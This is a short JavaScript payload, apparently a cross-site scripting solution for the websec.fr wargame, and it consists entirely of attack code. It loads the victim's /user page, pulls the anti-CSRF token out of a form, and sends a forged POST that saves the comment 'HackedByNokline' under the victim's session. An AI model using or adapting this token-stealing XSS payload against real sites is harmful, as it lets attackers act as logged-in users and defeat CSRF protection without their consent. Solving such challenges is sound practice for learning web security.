alert("Xss started...");
var r = new XMLHttpRequest();
r.open("GET", "http://websec.fr/user", false);
r.send(null);
document.body.innerHTML = r.responseText;
var c = document.forms[1][1].value;
r.open("POST", "http://websec.fr/user", true);
r.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
r.send(`comment=HackedByNokline&csrf=${encodeURIComponent(c)}&save=submit`);
